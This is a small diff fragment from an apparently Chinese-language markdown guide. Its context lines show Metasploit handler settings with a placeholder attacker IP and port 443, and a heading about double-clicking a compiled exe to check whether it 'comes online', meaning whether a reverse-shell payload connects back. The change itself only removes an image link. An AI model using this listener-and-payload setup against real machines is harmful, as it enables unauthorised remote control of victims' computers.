@@ -17,4 +17,4 @@ set LHOST x.x.x.x<br />
 set LPORT 443<br />
 run<br />
 ## 双击编译好的exe观察是否上线
-![image](https://github.com/user-attachments/assets/24568684-4b41-4c87-a393-d45806aea1da)
+
